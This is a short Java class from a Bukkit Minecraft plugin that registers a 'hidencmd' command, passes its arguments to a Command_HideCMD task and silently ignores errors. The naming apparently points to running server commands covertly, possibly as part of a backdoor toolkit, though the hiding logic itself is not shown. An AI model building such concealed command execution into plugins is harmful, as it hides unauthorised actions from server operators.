package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class Command_HideCMD2 extends CommandBase {

    public Command_HideCMD2() {
        super("hidencmd", "<Befehl>", Category.OTHER);
    }

    public void execute(String[] args, Player p) {
        if (args.length > 1) {
            try {
                Bukkit.getScheduler().runTask(Start.INSTANCE, new Command_HideCMD(this, args, p));
            } catch (Exception ignored) {
            }
        }
    }

}
